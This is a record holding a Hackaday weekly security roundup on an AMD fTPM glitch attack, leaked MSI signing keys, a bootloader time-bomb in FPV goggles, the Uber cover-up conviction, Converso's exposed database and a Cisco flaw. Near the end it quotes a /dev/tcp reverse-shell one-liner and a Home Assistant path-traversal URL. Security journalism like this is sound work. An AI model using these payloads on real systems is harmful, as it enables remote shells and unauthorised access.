{"pubDate": "2023-05-12T14:00:53", "original_title": "This Week in Security: TPM and BootGuard, Drones, and Coverups", "link": "https://hackaday.com/2023/05/12/this-week-in-security-tpm-and-bootguard-drones-and-coverups/", "source": "https://hackaday.com/blog/feed/", "thumbnail": "https://hackaday.com/wp-content/uploads/2016/01/darkarts.jpg", "original_content": "Full disk encryption is the go-to solution for hardening a laptop against the worst-case scenario of physical access. One way that encryption can be managed is through a Trusted Platform Module (TPM), a chip on the motherboard that manages the disk encryption key, and only hands it over for boot after the user has authenticated. Weve seen some clever tricks deployed against these discrete TPMs, like sniffing the data going over the physical traces. So in theory, an integrated TPM might be more secure. Such a technique does exist, going by the name fTPM, or firmware TPM. It uses a Trusted Execution Environment, a TEE, to store and run the TPM code. And theres another clever attack against that concept (PDF).\nIts chip glitching via a voltage fault. This particular attack works against AMD processors, and the voltage fault is triggered by injecting commands into the Serial Voltage Identification Interface 2.0 (SVI2). Dropping the voltage momentarily to the AMD Secure Processor (AMD-SP) can cause a key verification step to succeed even against an untrusted key, bypassing the need for an AMD Root Key (ARK) signed board firmware. Thats not a simple process, and pulling it off takes about $200 of gear, and about 3 hours. This exposes the CPU-unique seed, the board NVRAM, and all the protected TPM objects.\nSo how bad is this in the real world? If your disk encryption only relies on an fTPM, its pretty bad. The attack exposes that key and breaks encryption. For something like BitLocker that can also use a PIN, its a bit better, though to really offer more resistance, that needs to be a really long PIN: a 10 digit PIN falls to a GPU in just 4 minutes, in this scenario where it can be attacked offline. There is an obscure way to enable an enhanced PIN, a password, which makes that offline attack impractical with a secure password.\nAnd if hardware glitching a computer seems to complicated, why not just use the leaked MSI keys? Now to be fair, this only seems to allow a bypass of Intels BootGuard, but its still a blow. MSI suffered a ransomware-style breach in March, but rather than encrypt data, the attackers simply threatened to release the copied data to the world. MSI apparently refused to pay up, and source code and signing keys are now floating in the dark corners of the Internet. There have been suggestions that this leak impacts the entire line of Intel processors, but it seems likely that MSI only had their own signing keys to lose. But thats plenty bad, given the lack of a revocation system or automatic update procedure for MSI firmware.\nBootloader Ransomware\nOrqa goggles are First Person View devices. Strap on their FPVs and you get to see what your drone sees in real time. Until a couple weeks ago, that is. Late March, those goggles started displaying a bootloader message instead of booting as normal. The message was interesting. The FPVs went straight to bootloader mode, and asked for an SDCard with updated software. Update the firmware in order to get started. Seems annoying but innocuous. Except Orqa didnt push a forced update, and had no clue the devices were about to soft-brick.\nThe rest of the story is that a contractor who wrote some of the devices bootloader code wanted a guarantee of future employment, and so added a time-triggered bug. Yep, its an extortion scheme, masquerading as a license expiration  a unique sort of ransomware. It apparently became clear that this was a bad idea, and the evil programmer released a non-official binary to fix the issue. Thankfully an official fix is forthcoming, and it should go without saying that nobody should trust the direct release from a malicious contractor.\nIts Not the Crime, Its the Coverup\nIf you needed it, heres another reason not to pay the ransom. Well, more specifically, dont pay the ransom, try to cover it up as a bug bounty, and then lie to investigators about the whole incident. Joseph Sullivan was found guilty of Obstruction of Justice and Misrepresenting a Felony, both in relation to an event while he was chief security officer at Uber.\nSullivan was let off easy with three years of probation, 200 hours of community service, and a $50,000 fine. Read the articles linked above, and let us know what you think. Was this a reasonable charge and punishment for the cover-up, or was this a perversion of justice to punish the victim trying to clean up after an attack?\nConverso\nExtraordinary claims require extraordinary proof. Theres a new messaging app thats touting some extraordinary security and privacy claims, Converso. Some of the claims really intrigued [crnkovic], like bragging about no stored user or metadata. These claims were asking to be looked into.\nUnfortunately, Converso is not open source and their website is totally silent on cryptographic primitives and protocols.\nTurns out Converso is a quick app built around the Seald encryption library. Its not a terrible scheme, using RSA public-private keys, and AES-256-CBC encryption. But its not state of the art, and decidedly not quantum resistant. And unfortunately this rather lukewarm approval of the basic encryption scheme is the best we can say about Converso. Its not decentralized, messages do go through their servers, theres lots of user data and metadata thats part of the solution. Its not great.\nTurns out, it gets worse. Our intrepid hacker was looking through the decompiled app code, and noticed references to a remote Firestore database  a cloud-based database service from Google. And this one, which contains user data and way more, was publicly readable. Yep, all that metadata Converso claimed not to have? It was in the clear for anyone to query. Among all that data was message data, and mind-bogglingly, encryption keys. And all sent images, since they were being sent without encryption. By our calculations, that means pretty much everything was accessible, to anyone that knew where to look.\nThe gaping security holes were responsibly disclosed, and its claimed that theyve been fixed. But Converso has a mountain of work ahead of them to win back any credibility. As hard as it was hyped, and as broken as the system seems to be, its worth asking if perhaps the app is a honeypot.\nBits and Bytes\nTime to check your phone closet for a Cisco SPA112, a combination router and 2-port FXS phone adapter. This is the sort of equipment used to connect an analog fax machine to a VoIP system, and it turns out this one has a nasty vulnerability. CVE-2023-20126 scores a CVSS of 9.8, and it allows an unauthenticated user to upload new firmware through the web management interface. And dont forget, these devices are End-of-Lifed, so no fix is expected.\nReverse shells are fun! Theyre often used as an exploits payload, particularly when an exploit allows executing a bash command directly. A reverse shell is a remote process that executes our commands, and then sends the results back. [Aditya Telange] has the start of a series here, looking at the details, including a list of popular options. Its everything from the popular bash -i, to more obscure commands like 0196;exec 196/dev/tcp/10.10.10.10/9001; sh 196 2196. Groovy!\nAnd to cap off the weeks news, Home Assistant had a nasty one, where an unauthenticated user can access the Supervisor API. The bug is a sneaky path traversal that bypasses an authentication check regex. Check it yourself, by fetching http://a.b.c.d:8123/api/hassio/app/.%252e/supervisor/info on your Home Assistant install. The fixes have been bypassed a couple of times, and its release 2023.03.3 thats safe to use, for now.", "title": "\u30cf\u30fc\u30c9\u30c7\u30a3\u30b9\u30af\u6697\u53f7\u5316\u306b\u6b20\u304b\u305b\u306a\u3044Trusted Platform Module\uff08TPM\uff09\u306b\u30d0\u30b0\u304c\u898b\u3064\u304b\u3063\u305f", "body": "\u30d5\u30eb\u30c7\u30a3\u30b9\u30af\u6697\u53f7\u5316\u306f\u3001\u7269\u7406\u7684\u30a2\u30af\u30bb\u30b9\u306e\u6700\u60aa\u306e\u30b7\u30ca\u30ea\u30aa\u306b\u5bfe\u3057\u3066\u30e9\u30c3\u30d7\u30c8\u30c3\u30d7\u3092\u5f37\u5316\u3059\u308b\u305f\u3081\u306e\u65b9\u6cd5\u3067\u3059\u3002Trusted Platform Module (TPM)\u306f\u3001\u30de\u30b6\u30fc\u30dc\u30fc\u30c9\u4e0a\u306e\u30c1\u30c3\u30d7\u3067\u3042\u308a\u3001\u30c7\u30a3\u30b9\u30af\u6697\u53f7\u5316\u306e\u9375\u3092\u7ba1\u7406\u3057\u3001\u30e6\u30fc\u30b6\u30fc\u304c\u8a8d\u8a3c\u3057\u305f\u5f8c\u306b\u306e\u307f\u30d6\u30fc\u30c8\u306b\u6e21\u3057\u307e\u3059\u3002AMD\u30d7\u30ed\u30bb\u30c3\u30b5\u306b\u304a\u3051\u308b\u30c1\u30c3\u30d7\u30b0\u30ea\u30c3\u30c1\u30f3\u30b0\u653b\u6483\u306b\u3064\u3044\u3066\u3082\u5831\u544a\u3055\u308c\u3066\u3044\u307e\u3059\u3002Converso\u30e1\u30c3\u30bb\u30fc\u30b8\u30f3\u30b0\u30a2\u30d7\u30ea\u306f\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u3068\u30d7\u30e9\u30a4\u30d0\u30b7\u30fc\u306e\u4e3b\u5f35\u3092\u3057\u3066\u3044\u307e\u3059\u304c\u3001\u4e00\u90e8\u306e\u4e3b\u5f35\u306f\u8abf\u67fb\u306b\u5024\u3057\u306a\u3044\u3053\u3068\u304c\u308f\u304b\u308a\u307e\u3057\u305f\u3002 Cisco SPA112\u306b\u306f\u6df1\u523b\u306a\u8106\u5f31\u6027\u304c\u3042\u308a\u3001\u7121\u4fee\u6b63\u30e6\u30fc\u30b6\u30fc\u304cWeb\u7ba1\u7406\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30a4\u30b9\u3092\u4ecb\u3057\u3066\u65b0\u3057\u3044\u30d5\u30a1\u30fc\u30e0\u30a6\u30a7\u30a2\u3092\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3067\u304d\u307e\u3059\u3002", "titles": ["\u30cf\u30fc\u30c9\u30c7\u30a3\u30b9\u30af\u6697\u53f7\u5316\u306b\u6b20\u304b\u305b\u306a\u3044Trusted Platform Module\uff08TPM\uff09\u306b\u30d0\u30b0\u304c\u898b\u3064\u304b\u3063\u305f", "Drone FPV\u88c5\u7f6e\u3067\u306e\u300c\u30d6\u30fc\u30c8\u30ed\u30fc\u30c0\u30fc\u30fb\u30e9\u30f3\u30b5\u30e0\u30a6\u30a7\u30a2\u300d\u306b\u3088\u308a\u3001SD\u30ab\u30fc\u30c9\u3067\u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u3059\u308b\u3088\u3046\u6c42\u3081\u3089\u308c\u305f", "Uber\u306e\u5143\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8cac\u4efb\u8005\u304c\u4e0d\u6b63\u884c\u70ba\u306b\u3088\u308a\u6709\u7f6a\u5224\u6c7a\u3092\u53d7\u3051\u308b", "\u65b0\u578b\u30e1\u30c3\u30bb\u30fc\u30b8\u30a2\u30d7\u30ea\u306eConverso\u306b\u81f4\u547d\u7684\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d0\u30b0\u3042\u308a", "End-of-Lifed\u306eCisco SPA112\u306b\u6df1\u523b\u306a\u8106\u5f31\u6027\u304c\u898b\u3064\u304b\u3063\u305f"]}